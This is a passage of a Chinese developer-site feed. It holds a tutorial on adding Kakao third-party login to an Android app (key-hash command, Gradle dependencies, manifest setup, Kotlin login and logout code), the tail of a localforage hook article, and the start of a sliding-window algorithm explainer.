      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">keys</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(keys))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-keyword">return</span> [getItem, setItem, removeItem, clearItems, itemsLength, key, keys]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useLocalforage
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[带你玩转kakao登录 接入教程]]></title>    <link>https://juejin.cn/post/7589092567544250377</link>    <guid>https://juejin.cn/post/7589092567544250377</guid>    <pubDate>2025-12-29T10:03:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567544250377" data-draft-id="7588917508206100530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="带你玩转kakao登录 接入教程 "/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T10:03:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xq9527"/> <meta itemprop="url" content="https://juejin.cn/user/1239904848712184"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            带你玩转kakao登录 接入教程 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904848712184/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xq9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:03:07.000Z" title="Mon Dec 29 2025 10:03:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">前言导读</h4>
<p>各位同学大家好，有段时间没有跟大家见面了，最近因为换了新工作，所以也是遇到一些新的需求和业务，正好需要接一个韩国的第三方登录，kakao登录，刚好今天调试OK了所以能就想着跟大家分享一下，那么废话不多说，我们正式开始</p>
<h4 data-id="heading-1">官方文档</h4>
<h4 data-id="heading-2">参数和依赖文档</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.kakao.com%2Fdocs%2Flatest%2Fen%2Fandroid%2Fgetting-started%23install" target="_blank" title="https://developers.kakao.com/docs/latest/en/android/getting-started#install" ref="nofollow noopener noreferrer">developers.kakao.com/docs/latest…</a></p>
<h4 data-id="heading-3">具体接入指南</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.kakao.com%2Fdocs%2Flatest%2Fen%2Fkakaologin%2Fandroid%23logout" target="_blank" title="https://developers.kakao.com/docs/latest/en/kakaologin/android#logout" ref="nofollow noopener noreferrer">developers.kakao.com/docs/latest…</a></p>
<h4 data-id="heading-4">具体实现</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1d4fab3c8464ca59f11bf0e2a9526a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=oq6RIOdNYz5nmPN9mYP4pAmFU4Q%3D" alt="image.png" loading="lazy"/>
我们看到这张图 我们只需要登录的部分，我们在依赖了我们的调用kakao登录后拿到我们的token.accessToken  然后去服务端进行校验即可</p>
<h4 data-id="heading-5">准备工作</h4>
<p>获取散列 对没有错这个kakao登录和facebook 一样需要填我们的散列 其实就是我们的签名jks的sha1 base 64之后的产物
使用命令获取</p>
<pre><code class="hljs language-bash" lang="bash">keytool -exportcert -<span class="hljs-built_in">alias</span> &lt;RELEASE_KEY_ALIAS&gt; -keystore &lt;RELEASE_KEY_PATH&gt; | openssl sha1 -binary | openssl <span class="hljs-built_in">base64</span>
</code></pre>
<p>或者也可以使用 代码获取</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> keyHash = Utility.getKeyHash(context)
Log.e(TAG, <span class="hljs-string">"keyHash init: "</span>+keyHash)
</code></pre>
<h4 data-id="heading-6">我们可以到代码底层其实也是获取了sha1 然后base 64的</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-meta">@TargetApi(Build.VERSION_CODES.P)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getKeyHash</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> getKeyHashDeprecated(context)
    }

    <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
    <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"PackageManagerGetSignatures"</span>)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getKeyHashDeprecated</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span>: String {
        <span class="hljs-keyword">val</span> packageInfo = context.packageManager
            .getPackageInfo(context.packageName, PackageManager.GET_SIGNATURES)
        <span class="hljs-keyword">for</span> (signature <span class="hljs-keyword">in</span> packageInfo.signatures ?: emptyArray()) {
            <span class="hljs-keyword">val</span> md = MessageDigest.getInstance(<span class="hljs-string">"SHA"</span>)
            md.update(signature.toByteArray())
            <span class="hljs-keyword">return</span> Base64.encodeToString(md.digest(), Base64.NO_WRAP)
        }
        <span class="hljs-keyword">throw</span> IllegalStateException()
    }
</code></pre>
<h4 data-id="heading-7">登录需要的依赖</h4>
<p>在我们的library 或者app层的build.grale 添加依赖</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// Kakao SDK 依赖</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-all:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-user:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-share:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-talk:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-friend:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-navi:latest.release"</span>
implementation <span class="hljs-string">"com.kakao.sdk:v2-cert:latest.release"</span>
</code></pre>
<h4 data-id="heading-8">指定jdk版本</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/786ad07b7af847ff8e9596560cd49f42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=R2%2BIGsddqtdNY03qesVsUSpG%2FhY%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">在build.gradle里面添加如下配置</h4>
<pre><code class="hljs language-ini" lang="ini">compileOptions {
    sourceCompatibility JavaVersion.VERSION_11
    targetCompatibility JavaVersion.VERSION_11
    <span class="hljs-attr">coreLibraryDesugaringEnabled</span> = <span class="hljs-literal">true</span>
}
</code></pre>
<p>然后在我们的最外层的 build.gradle 添加kotlin的支持</p>
<pre><code class="hljs language-bash" lang="bash">ext.kotlin_version = <span class="hljs-string">"2.0.0"</span>
classpath <span class="hljs-string">"org.jetbrains.kotlin:kotlin-gradle-plugin:<span class="hljs-variable">$kotlin_version</span>"</span>
</code></pre>
<h4 data-id="heading-10">清单文件配置</h4>
<p>kakao${YOUR_NATIVE_APP_KEY} 这里是前面kakao 拼接你申请的参数的应用的key</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"com.kakao.sdk.auth.AuthCodeHandlerActivity"</span>
    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">"true"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.VIEW"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.DEFAULT"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.BROWSABLE"</span> /&gt;</span>

        <span class="hljs-comment">&lt;!-- Redirect URI: "kakao${YOUR_NATIVE_APP_KEY}://oauth" --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">"kakao${YOUR_NATIVE_APP_KEY}"</span> <span class="hljs-attr">android:host</span>=<span class="hljs-string">"oauth"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
</code></pre>
<h4 data-id="heading-11">具体代码实现</h4>
<h4 data-id="heading-12">初始化kakao登录</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">init</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>)</span></span> {
    <span class="hljs-comment">//这里xxxxxxxxxxxxxxx 要换成真实的id</span>
    KakaoSdk.<span class="hljs-keyword">init</span>(context, <span class="hljs-string">"xxxxxxxxxxxxxxx);
    var keyHash = Utility.getKeyHash(context)
    Log.e(TAG, "</span>keyHash <span class="hljs-keyword">init</span>: <span class="hljs-string">"+keyHash)

}
</span></code></pre>
<h4 data-id="heading-13">需要在 Application 的onCreate 里面调用</h4>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GameApplication</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title">Application</span> </span>{
    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-type">TAG</span> = <span class="hljs-string">"GameApplication"</span>;

    <span class="hljs-meta">@Override</span>
    public void onCreate() {
        <span class="hljs-keyword">super</span>.onCreate();
        <span class="hljs-type">Log</span>.e(<span class="hljs-type">TAG</span>, <span class="hljs-string">"onCreate: "</span> );
        <span class="hljs-type">MultiDex</span>.install(<span class="hljs-keyword">this</span>);
        <span class="hljs-type">KakaoKtInit</span>.<span class="hljs-type">Companion</span>.getInstance().init(<span class="hljs-keyword">this</span>);
     
     }
 }
</code></pre>
<h4 data-id="heading-14">kakao发起授权登录</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span>  <span class="hljs-title">login</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>,dialog: <span class="hljs-type">Dialog</span>)</span></span>{
    UserApiClient.instance.loginWithKakao(activity, uiMode= LoginUiMode.AUTO) { token, error -&gt;
        <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
            Log.e(TAG, <span class="hljs-string">"Login failed."</span>, error)
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (token != <span class="hljs-literal">null</span>) {
            Log.i(TAG, <span class="hljs-string">"Login succeeded. <span class="hljs-subst">${token.accessToken}</span>"</span>)
          
        }
    }
}
</code></pre>
<h4 data-id="heading-15">调起效果图</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e884c9c60ab4001aa38ff6b46d3b25f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=27l7QvLZLxhsoHtufukrQZ6JUiQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-16">拿到回调的 accessToken</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edaa7026e51144be8c8aa6f653ede4b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeHE5NTI3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607387&amp;x-signature=Sf7SzjG7n74QsfzqXTs4TMS70eg%3D" alt="image.png" loading="lazy"/></p>
<p>我们拿到accessToken 然后去请求我们服务端进行登录验证即可。</p>
<h4 data-id="heading-17">kakao注销</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-comment">/***
 * 注销登录
 *
 */</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span>  <span class="hljs-title">loginOut</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span>{
    UserApiClient.instance.logout { error -&gt;
        <span class="hljs-keyword">if</span> (error != <span class="hljs-literal">null</span>) {
            Log.e(TAG, <span class="hljs-string">"Logout fail. Tokens are revoked from SDK"</span>, error)
        }
        <span class="hljs-keyword">else</span> {
            Log.i(TAG, <span class="hljs-string">"Logout success. Tokens are revoked from SDK"</span>)
        }
    }
}
</code></pre>
<h4 data-id="heading-18">最后总结：</h4>
<p>整个的这个kakao登录还算比较简单的，我们要注意的几个点 第一个就是初始化的位置要对 ，第二个就是我们的散列要配置对 不然会报出签名和线上散列对不上或者未配置都会导致授权失败，整体来说比naver登录要简单很多，kakao整个功能是非常强大，也是韩国的国名及app应用，有兴趣的同学可以查阅官方文档去查看更多自己需要的功能</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[滑动窗口详解：原理+分类+场景+模板+例题（视频贼清晰）]]></title>    <link>https://juejin.cn/post/7589159665855692819</link>    <guid>https://juejin.cn/post/7589159665855692819</guid>    <pubDate>2025-12-29T10:28:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665855692819" data-draft-id="7589126217250357289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="滑动窗口详解：原理+分类+场景+模板+例题（视频贼清晰）"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T10:28:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜酱"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            滑动窗口详解：原理+分类+场景+模板+例题（视频贼清晰）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:28:00.000Z" title="Mon Dec 29 2025 10:28:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">滑动窗口详解：原理+分类+场景+模板+例题</h2>
<blockquote>
<p>📺 <strong>推荐视频</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fb23.tv%2FrU4vRca" target="_blank" title="https://b23.tv/rU4vRca" ref="nofollow noopener noreferrer">滑动窗口算法详解</a> - 视频解释非常清晰，建议先看视频再阅读本文！</p>
</blockquote>
<p>在算法面试中，子串、子数组相关的问题频繁出现，暴力枚举往往因 O(n²) 时间复杂度超时。而滑动窗口算法，凭借其 O(n) 的高效性能，成为解决这类问题的"神兵利器"。本文将从原理本质出发，梳理滑动窗口的分类、适用场景，提炼通用模板，并结合经典例题实战拆解，帮你彻底掌握这一核心算法。</p>
<h2 data-id="heading-1">一、滑动窗口核心原理：用单调性压缩遍历维度</h2>
<p>滑动窗口的本质，是<strong>利用区间的单调性，将原本需要嵌套遍历（O(n²)）的连续区间问题，转化为单轮双指针遍历（O(n)）</strong>。其核心逻辑基于对“窗口状态”的精准把控，通过两个指针（left 左边界、right 右边界）的协同移动，跳过无效区间（剪枝），实现高效枚举。</p>
<h3 data-id="heading-2">1.1 先搞懂：暴力枚举的痛点</h3>
<p>以“无重复字符的最长子串”为例，暴力思路是枚举所有子串的起点 i 和终点 j（i≤j），检查子串 s[i..j] 是否无重复，最终记录最长长度。这种方式需要遍历所有 i、j 组合，时间复杂度 O(n²)，且存在大量无效计算：比如当 s[0..3] 存在重复时，s[0..4]、s[0..5] 等包含该区间的子串必然也重复，无需再检查。</p>
<h3 data-id="heading-3">1.2 滑动窗口的核心洞察：区间单调性</h3>
<p>滑动窗口能优化的关键，是抓住了「窗口状态的单调性」—— 窗口的状态（如是否含重复、和/积是否满足条件）会随窗口的扩展/缩小呈现单向变化，具体可总结为两条核心规律：</p>
<ul>
<li>
<p><strong>规律1（坏状态的包含性）</strong>：若窗口 [left, right] 处于“坏状态”（如含重复字符、和≥target、积≥K），则所有包含该窗口的更大窗口 [left, right+1]、[left, right+2]... 必然也是“坏状态”。此时无需继续扩展 right，应移动 left 缩小窗口，跳过无效区间。</p>
</li>
<li>
<p><strong>规律2（好状态的被包含性）</strong>：若窗口 [left, right] 处于“好状态”（如无重复、和&lt;target、积&lt;K），则所有被该窗口包含的更小窗口 [left+1, right]、[left+2, right]... 必然也是“好状态”。此时无需缩小窗口，应继续扩展 right 寻找更优解。</p>
</li>
</ul>
<h3 data-id="heading-4">1.3 一句话总结原理</h3>
<p>滑动窗口通过 right 指针“扩窗口”探索新的区间，通过 left 指针“缩窗口”剔除无效区间，每个元素最多被加入窗口（right 移动）和移出窗口（left 移动）各一次，最终以 O(n) 时间完成所有有效区间的枚举。</p>
<h2 data-id="heading-5">二、滑动窗口的分类：按目标场景划分</h2>
